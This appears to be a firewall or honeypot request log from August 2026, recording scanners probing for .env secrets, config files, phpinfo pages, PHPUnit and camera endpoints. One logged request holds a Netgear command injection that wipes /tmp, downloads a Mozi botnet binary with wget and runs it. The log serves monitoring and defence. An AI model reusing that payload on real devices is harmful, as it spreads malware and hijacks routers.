+{"time": "2026-08-04 11:45:46", "ip": "50.114.236.5", "path": "/vendor/phpunit/phpunit/LICENSE/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 11:45:52", "ip": "50.114.236.5", "path": "/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 11:45:58", "ip": "50.114.236.5", "path": "/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 11:46:03", "ip": "50.114.236.5", "path": "/phpunit/phpunit/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 11:46:10", "ip": "50.114.236.5", "path": "/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 11:46:15", "ip": "50.114.236.5", "path": "/phpunit/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 11:46:21", "ip": "50.114.236.5", "path": "/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "action": "allowed"}
+{"time": "2026-08-04 12:41:48", "ip": "82.21.245.45", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 12:41:49", "ip": "82.21.245.45", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-04 13:12:15", "ip": "195.182.16.23", "path": "/SDK/webLanguage", "action": "allowed"}
+{"time": "2026-08-04 13:55:41", "ip": "85.217.149.20", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 14:29:32", "ip": "20.220.203.117", "path": "/wp-content/plugins/hellopress/wp_filemanager.php", "action": "allowed"}
+{"time": "2026-08-04 14:31:59", "ip": "20.220.203.117", "path": "/wp-content/plugins/hellopress/wp_filemanager.php", "action": "allowed"}
+{"time": "2026-08-04 14:37:02", "ip": "62.210.142.39", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 14:38:14", "ip": "62.210.142.39", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 14:39:05", "ip": "62.210.142.39", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 14:39:11", "ip": "62.210.142.39", "path": "/manage/account/login", "action": "allowed"}
+{"time": "2026-08-04 14:39:16", "ip": "62.210.142.39", "path": "/admin/index.html", "action": "allowed"}
+{"time": "2026-08-04 14:39:21", "ip": "62.210.142.39", "path": "/index.html", "action": "allowed"}
+{"time": "2026-08-04 14:39:27", "ip": "62.210.142.39", "path": "/+CSCOE+/logon.html", "action": "allowed"}
+{"time": "2026-08-04 15:15:37", "ip": "185.226.197.72", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 15:24:50", "ip": "92.113.115.211", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 15:24:50", "ip": "92.113.115.211", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-04 15:54:32", "ip": "24.144.87.113", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 15:54:37", "ip": "24.144.87.113", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-04 16:10:27", "ip": "217.69.127.22", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 16:10:28", "ip": "217.69.127.22", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-04 16:16:41", "ip": "94.154.43.254", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 16:20:29", "ip": "66.249.69.40", "path": "/robots.txt", "action": "allowed"}
+{"time": "2026-08-04 17:06:49", "ip": "44.212.15.65", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 17:40:44", "ip": "92.118.39.86", "path": "/op/7_md/9/1/2/3/4", "action": "allowed"}
+{"time": "2026-08-04 18:26:55", "ip": "153.117.6.33", "path": "/GponForm/diag_Form?images/", "action": "allowed"}
+{"time": "2026-08-04 18:30:36", "ip": "94.154.43.254", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 18:41:34", "ip": "45.38.86.112", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 18:41:35", "ip": "45.38.86.112", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-04 19:28:01", "ip": "5.224.64.230", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 19:28:08", "ip": "5.224.64.230", "path": "/TS/Api/home/util/Db/GetDataTable?sql=SELECT%201", "action": "attack_blocked", "attempt": 2}
+{"time": "2026-08-04 19:40:32", "ip": "5.224.64.230", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 19:40:38", "ip": "5.224.64.230", "path": "/TS/Api/home/util/Db/GetDataTable?sql=SELECT%201", "action": "attack_blocked", "attempt": 3}
+{"time": "2026-08-04 19:51:56", "ip": "106.75.7.49", "path": "/version", "action": "allowed"}
+{"time": "2026-08-04 19:51:56", "ip": "106.75.7.49", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 19:51:57", "ip": "106.75.7.49", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 19:52:03", "ip": "106.75.7.49", "path": "/v1", "action": "allowed"}
+{"time": "2026-08-04 19:52:03", "ip": "106.75.7.49", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 19:52:19", "ip": "106.75.173.148", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 19:52:25", "ip": "106.75.173.148", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-04 20:09:35", "ip": "80.82.77.139", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 20:09:41", "ip": "80.82.77.139", "path": "/robots.txt", "action": "allowed"}
+{"time": "2026-08-04 20:09:46", "ip": "80.82.77.139", "path": "/sitemap.xml", "action": "allowed"}
+{"time": "2026-08-04 20:09:51", "ip": "80.82.77.139", "path": "/.well-known/security.txt", "action": "allowed"}
+{"time": "2026-08-04 20:16:45", "ip": "64.89.163.110", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 20:18:23", "ip": "64.89.163.110", "path": "/.env", "action": "attack_blocked", "attempt": 2}
+{"time": "2026-08-04 22:04:51", "ip": "181.214.32.237", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 22:04:52", "ip": "181.214.32.237", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-04 22:07:59", "ip": "205.210.31.67", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 22:13:11", "ip": "93.174.93.12", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 23:27:14", "ip": "172.98.33.159", "path": "/.DS_Store", "action": "allowed"}
+{"time": "2026-08-04 23:27:27", "ip": "172.98.33.149", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 23:27:34", "ip": "172.98.33.168", "path": "/whm", "action": "allowed"}
+{"time": "2026-08-04 23:27:52", "ip": "172.98.33.152", "path": "/index.php?p=admin/dashboard", "action": "allowed"}
+{"time": "2026-08-04 23:27:54", "ip": "172.98.33.149", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 23:27:58", "ip": "172.98.33.158", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 23:28:00", "ip": "172.98.33.155", "path": "/.env.prod", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 23:28:02", "ip": "172.98.33.166", "path": "/.env.production", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 23:28:06", "ip": "172.98.33.153", "path": "/redmine/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 23:28:10", "ip": "172.98.33.173", "path": "/__tests__/test-become/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 23:28:16", "ip": "172.98.33.165", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 23:28:17", "ip": "172.98.33.164", "path": "/config/config.js", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 23:28:33", "ip": "172.98.33.176", "path": "/src/config.js", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 23:28:34", "ip": "172.98.33.168", "path": "/src/api/config.js", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 23:28:36", "ip": "172.98.33.161", "path": "/web/api/config.js", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 23:28:42", "ip": "172.98.33.173", "path": "/env.dev.js", "action": "allowed"}
+{"time": "2026-08-04 23:28:52", "ip": "172.98.33.156", "path": "/env.development.js", "action": "allowed"}
+{"time": "2026-08-04 23:28:58", "ip": "173.239.224.224", "path": "/env.js", "action": "allowed"}
+{"time": "2026-08-04 23:29:04", "ip": "172.98.33.149", "path": "/env.prod.js", "action": "allowed"}
+{"time": "2026-08-04 23:29:10", "ip": "172.98.33.158", "path": "/env.production.js", "action": "allowed"}
+{"time": "2026-08-04 23:29:12", "ip": "172.98.33.167", "path": "/..;/env.dev.js", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 23:29:16", "ip": "172.98.33.151", "path": "/..;/env.development.js", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 23:29:34", "ip": "172.98.33.168", "path": "/..;/env.prod.js", "action": "attack_blocked", "attempt": 2}
+{"time": "2026-08-04 23:29:36", "ip": "172.98.33.151", "path": "/..;/env.production.js", "action": "attack_blocked", "attempt": 2}
+{"time": "2026-08-04 23:29:39", "ip": "172.98.33.158", "path": "/config.js", "action": "attack_blocked", "attempt": 2}
+{"time": "2026-08-04 23:29:52", "ip": "172.98.33.158", "path": "/api/config.js", "action": "attack_blocked", "attempt": 3}
+{"time": "2026-08-04 23:29:53", "ip": "172.98.33.174", "path": "/app/config.js", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 23:30:00", "ip": "173.239.224.224", "path": "/app.js", "action": "allowed"}
+{"time": "2026-08-04 23:30:06", "ip": "172.98.33.169", "path": "/main.js", "action": "allowed"}
+{"time": "2026-08-04 23:30:18", "ip": "172.98.33.162", "path": "/static/js/config.js", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 23:30:43", "ip": "172.98.33.150", "path": "/public/js/config.js", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 23:30:50", "ip": "172.98.33.160", "path": "/__debug__/render_panel/?panel_id=SettingsPanel", "action": "allowed"}
+{"time": "2026-08-04 23:30:55", "ip": "20.98.166.120", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 23:30:58", "ip": "172.98.33.153", "path": "/_profiler/phpinfo", "action": "allowed"}
+{"time": "2026-08-04 23:31:06", "ip": "172.98.33.161", "path": "/app_dev.php/_profiler/phpinfo", "action": "allowed"}
+{"time": "2026-08-04 23:31:23", "ip": "172.98.33.156", "path": "/owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php", "action": "allowed"}
+{"time": "2026-08-04 23:31:33", "ip": "172.98.33.169", "path": "/info.php", "action": "allowed"}
+{"time": "2026-08-04 23:31:36", "ip": "172.98.33.168", "path": "/", "action": "allowed"}
+{"time": "2026-08-04 23:50:28", "ip": "20.100.178.111", "path": "/wp-content/plugins/hellopress/wp_filemanager.php", "action": "allowed"}
+{"time": "2026-08-04 23:52:43", "ip": "198.105.100.67", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-04 23:52:44", "ip": "198.105.100.67", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-05 00:21:39", "ip": "88.80.24.26", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-05 00:23:21", "ip": "147.185.132.237", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 00:29:09", "ip": "45.61.134.116", "path": "/api/v1/licensing/about", "action": "allowed"}
+{"time": "2026-08-05 00:29:10", "ip": "45.61.134.116", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 00:45:27", "ip": "120.85.115.23", "path": "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1", "action": "allowed"}
+{"time": "2026-08-05 01:38:12", "ip": "31.58.22.229", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-05 01:38:13", "ip": "31.58.22.229", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-05 02:00:57", "ip": "93.174.93.12", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 02:42:22", "ip": "167.71.74.36", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 02:42:27", "ip": "167.71.74.36", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-05 03:09:10", "ip": "138.197.16.14", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 03:38:03", "ip": "205.210.31.26", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 03:45:49", "ip": "205.210.31.22", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 05:00:32", "ip": "47.250.141.141", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 05:00:32", "ip": "47.250.141.141", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 05:00:47", "ip": "123.160.223.75", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 05:00:58", "ip": "123.160.223.75", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-05 05:35:45", "ip": "34.81.28.243", "path": "/snapshot.jpeg", "action": "allowed"}
+{"time": "2026-08-05 05:35:45", "ip": "34.81.28.243", "path": "/Streaming/channels/101/picture", "action": "allowed"}
+{"time": "2026-08-05 05:35:45", "ip": "34.81.28.243", "path": "/tmpfs/auto.jpg", "action": "allowed"}
+{"time": "2026-08-05 05:35:50", "ip": "34.81.28.243", "path": "/cgi-bin/snapshot.cgi", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-05 05:35:50", "ip": "34.81.28.243", "path": "/snapshot.jpg", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-05 05:44:12", "ip": "82.21.248.39", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-05 05:44:13", "ip": "82.21.248.39", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-05 06:04:38", "ip": "112.46.212.69", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 06:59:45", "ip": "45.39.35.150", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-05 06:59:47", "ip": "45.39.35.150", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-05 07:15:53", "ip": "3.129.187.38", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 07:17:52", "ip": "3.129.187.38", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 08:02:46", "ip": "156.229.163.164", "path": "http://hy2.buchudui.asia:3333/", "action": "backend_error", "error": "<urlopen error [Errno -2] Name or service not known>"}
+{"time": "2026-08-05 08:21:03", "ip": "3.131.220.121", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 08:21:22", "ip": "3.131.220.121", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 08:32:38", "ip": "216.218.206.66", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 08:37:02", "ip": "216.218.206.66", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-05 08:38:40", "ip": "216.218.206.66", "path": "/geoserver/web/", "action": "allowed"}
+{"time": "2026-08-05 08:47:53", "ip": "66.132.195.119", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 08:48:04", "ip": "66.132.195.119", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-05 08:48:34", "ip": "66.132.195.119", "path": "/sitemap.xml", "action": "allowed"}
+{"time": "2026-08-05 08:48:41", "ip": "66.132.195.119", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-05 08:48:50", "ip": "66.132.195.119", "path": "/un58pvjbpbmlx", "action": "allowed"}
+{"time": "2026-08-05 08:48:56", "ip": "66.132.195.119", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-05 09:40:06", "ip": "82.23.223.124", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-05 09:40:07", "ip": "82.23.223.124", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-05 10:03:59", "ip": "5.61.209.92", "path": "/SDK/webLanguage", "action": "allowed"}
+{"time": "2026-08-05 10:10:17", "ip": "34.81.28.243", "path": "/snapshot.jpg", "action": "allowed"}
+{"time": "2026-08-05 10:10:17", "ip": "34.81.28.243", "path": "/snapshot.jpeg", "action": "allowed"}
+{"time": "2026-08-05 10:10:17", "ip": "34.81.28.243", "path": "/cgi-bin/snapshot.cgi", "action": "allowed"}
+{"time": "2026-08-05 10:10:22", "ip": "34.81.28.243", "path": "/tmpfs/auto.jpg", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-05 10:10:22", "ip": "34.81.28.243", "path": "/Streaming/channels/101/picture", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-05 10:56:30", "ip": "20.65.193.76", "path": "/developmentserver/metadatauploader", "action": "allowed"}
+{"time": "2026-08-05 11:46:19", "ip": "172.120.119.229", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-05 11:46:20", "ip": "172.120.119.229", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-05 12:04:24", "ip": "8.211.154.230", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 12:04:24", "ip": "8.211.154.230", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 12:15:45", "ip": "8.219.110.212", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 13:13:32", "ip": "118.81.202.71", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 13:13:33", "ip": "171.104.81.229", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 13:14:18", "ip": "182.119.226.142", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 13:36:24", "ip": "27.60.55.90", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 13:36:29", "ip": "27.60.55.90", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-05 13:36:46", "ip": "27.60.55.90", "path": "/speak", "action": "backend_error", "error": "HTTP Error 500: INTERNAL SERVER ERROR"}
+{"time": "2026-08-05 14:08:25", "ip": "216.180.246.2", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 14:08:59", "ip": "216.180.246.2", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 14:09:33", "ip": "216.180.246.2", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 14:13:16", "ip": "216.180.246.2", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 14:13:25", "ip": "216.180.246.2", "path": "/manage/account/login", "action": "allowed"}
+{"time": "2026-08-05 14:13:37", "ip": "216.180.246.2", "path": "/admin/index.html", "action": "allowed"}
+{"time": "2026-08-05 14:52:27", "ip": "34.81.28.243", "path": "/cgi-bin/snapshot.cgi", "action": "allowed"}
+{"time": "2026-08-05 14:59:10", "ip": "92.112.238.173", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-05 14:59:11", "ip": "92.112.238.173", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-05 15:40:02", "ip": "45.61.134.116", "path": "/api/v1/licensing/about", "action": "allowed"}
+{"time": "2026-08-05 15:40:03", "ip": "45.61.134.116", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 16:17:55", "ip": "66.132.195.118", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 16:18:03", "ip": "66.132.195.118", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-05 16:18:21", "ip": "66.132.195.118", "path": "/wiki", "action": "allowed"}
+{"time": "2026-08-05 16:18:27", "ip": "66.132.195.118", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-05 16:18:36", "ip": "66.132.195.118", "path": "/wh4opwp7jh6tf3n", "action": "allowed"}
+{"time": "2026-08-05 16:18:47", "ip": "66.132.195.118", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-05 16:35:06", "ip": "46.203.196.159", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-05 16:35:07", "ip": "46.203.196.159", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-05 16:39:17", "ip": "66.249.69.38", "path": "/robots.txt", "action": "allowed"}
+{"time": "2026-08-05 17:16:03", "ip": "54.173.151.250", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 18:53:21", "ip": "45.39.75.71", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-05 18:53:22", "ip": "45.39.75.71", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-05 19:50:00", "ip": "45.61.134.116", "path": "/api/v1/licensing/about", "action": "allowed"}
+{"time": "2026-08-05 19:50:02", "ip": "45.61.134.116", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 19:51:26", "ip": "34.81.28.243", "path": "/snapshot.jpeg", "action": "allowed"}
+{"time": "2026-08-05 19:51:26", "ip": "34.81.28.243", "path": "/Streaming/channels/101/picture", "action": "allowed"}
+{"time": "2026-08-05 19:51:26", "ip": "34.81.28.243", "path": "/tmpfs/auto.jpg", "action": "allowed"}
+{"time": "2026-08-05 19:51:31", "ip": "34.81.28.243", "path": "/snapshot.jpg", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-05 19:51:31", "ip": "34.81.28.243", "path": "/cgi-bin/snapshot.cgi", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-05 20:26:14", "ip": "38.225.2.140", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-05 20:26:15", "ip": "38.225.2.140", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-05 22:16:06", "ip": "45.39.17.176", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-05 22:16:08", "ip": "45.39.17.176", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-05 22:19:49", "ip": "170.64.154.131", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 22:40:40", "ip": "103.203.57.3", "path": "/", "action": "allowed"}
+{"time": "2026-08-05 23:54:01", "ip": "172.213.153.79", "path": "/wp-content/plugins/hellopress/wp_filemanager.php", "action": "allowed"}
+{"time": "2026-08-05 23:56:43", "ip": "172.213.153.79", "path": "/wp-content/plugins/hellopress/wp_filemanager.php", "action": "allowed"}
+{"time": "2026-08-06 00:28:27", "ip": "205.210.31.45", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 00:55:53", "ip": "164.52.24.185", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 00:55:59", "ip": "164.52.24.185", "path": "/v1/models", "action": "allowed"}
+{"time": "2026-08-06 00:56:04", "ip": "164.52.24.185", "path": "/v1/embeddings", "action": "allowed"}
+{"time": "2026-08-06 00:56:32", "ip": "164.52.24.185", "path": "/v1/completions", "action": "allowed"}
+{"time": "2026-08-06 01:19:12", "ip": "45.156.129.189", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 01:19:28", "ip": "45.156.129.186", "path": "/license.txt", "action": "allowed"}
+{"time": "2026-08-06 01:19:49", "ip": "45.156.129.191", "path": "/wp-json", "action": "allowed"}
+{"time": "2026-08-06 01:26:58", "ip": "18.116.101.220", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 01:27:31", "ip": "18.116.101.220", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 02:12:55", "ip": "172.237.121.177", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 02:13:01", "ip": "172.237.121.177", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-06 02:27:20", "ip": "18.116.101.220", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 02:27:42", "ip": "18.116.101.220", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 02:43:44", "ip": "152.232.95.101", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-06 02:43:45", "ip": "152.232.95.101", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-06 02:47:02", "ip": "205.210.31.141", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 02:47:44", "ip": "188.166.122.218", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 02:47:49", "ip": "188.166.122.218", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-06 02:51:35", "ip": "93.174.93.12", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 03:38:49", "ip": "45.156.129.52", "path": "/owncloud/status.php", "action": "allowed"}
+{"time": "2026-08-06 03:38:55", "ip": "45.156.129.52", "path": "/status.php", "action": "allowed"}
+{"time": "2026-08-06 04:18:26", "ip": "172.202.104.202", "path": "/hudson", "action": "allowed"}
+{"time": "2026-08-06 05:25:27", "ip": "82.23.227.105", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-06 05:25:28", "ip": "82.23.227.105", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-06 05:39:40", "ip": "216.180.246.85", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 05:40:24", "ip": "216.180.246.85", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 05:45:23", "ip": "216.180.246.85", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 05:45:32", "ip": "216.180.246.85", "path": "/manage/account/login", "action": "allowed"}
+{"time": "2026-08-06 05:45:43", "ip": "216.180.246.85", "path": "/admin/index.html", "action": "allowed"}
+{"time": "2026-08-06 06:31:04", "ip": "202.125.94.185", "path": "/admin/config.php", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-06 07:03:53", "ip": "135.237.127.14", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 07:04:33", "ip": "161.123.130.200", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-06 07:04:34", "ip": "161.123.130.200", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-06 07:17:12", "ip": "94.154.43.36", "path": "http://161.118.248.208:3333/", "action": "backend_error", "error": "<urlopen error [Errno -2] Name or service not known>"}
+{"time": "2026-08-06 07:27:36", "ip": "167.99.225.143", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 07:54:37", "ip": "18.218.118.203", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 07:55:39", "ip": "18.218.118.203", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 08:12:11", "ip": "20.251.48.84", "path": "/wp-content/plugins/hellopress/wp_filemanager.php", "action": "allowed"}
+{"time": "2026-08-06 08:13:30", "ip": "198.235.24.43", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 08:18:49", "ip": "47.245.138.0", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 08:18:49", "ip": "47.245.138.0", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 08:23:23", "ip": "87.236.176.109", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 10:16:32", "ip": "74.248.16.78", "path": "/wp-content/plugins/hellopress/wp_filemanager.php", "action": "allowed"}
+{"time": "2026-08-06 10:22:48", "ip": "45.38.89.185", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-06 10:22:50", "ip": "45.38.89.185", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-06 10:23:04", "ip": "85.217.149.7", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 12:39:18", "ip": "45.41.162.110", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-06 12:39:20", "ip": "45.41.162.110", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-06 13:33:45", "ip": "5.133.197.147", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 14:12:21", "ip": "45.43.65.176", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-06 14:12:21", "ip": "45.43.65.176", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-06 14:53:13", "ip": "117.99.135.24", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 14:53:29", "ip": "117.99.135.24", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-06 16:53:33", "ip": "172.202.113.141", "path": "/portal/redlion", "action": "allowed"}
+{"time": "2026-08-06 17:05:10", "ip": "20.221.68.122", "path": "/actuator/health", "action": "allowed"}
+{"time": "2026-08-06 17:09:26", "ip": "66.132.172.134", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 17:09:33", "ip": "66.132.172.134", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-06 17:09:59", "ip": "3.88.203.46", "path": "/", "action": "allowed"}
+{"time": "2026-08-06 17:10:08", "ip": "66.132.172.134", "path": "/login", "action": "allowed"}
